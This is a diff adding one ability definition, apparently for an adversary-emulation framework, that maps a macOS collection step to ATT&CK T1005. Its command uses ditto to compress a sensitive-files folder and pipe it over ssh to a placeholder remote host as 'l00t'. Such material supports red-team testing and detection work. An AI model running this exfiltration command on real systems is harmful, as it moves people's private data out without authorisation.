@@ -1,0 +1,21 @@
+---
+
+- id: d9370c91-c301-776b-7414-fc579f716d52
+  name: ditto - Copy, compress, and transfer sensitive data to a remote macOS host
+  description: The following command gathers and compresses (-c) files from the specified folder and writes
+    them to a zip (-k) file.
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    darwin:
+      sh:
+        command: ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc -
+          /home/user/l00t
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - ditto
+  - collection
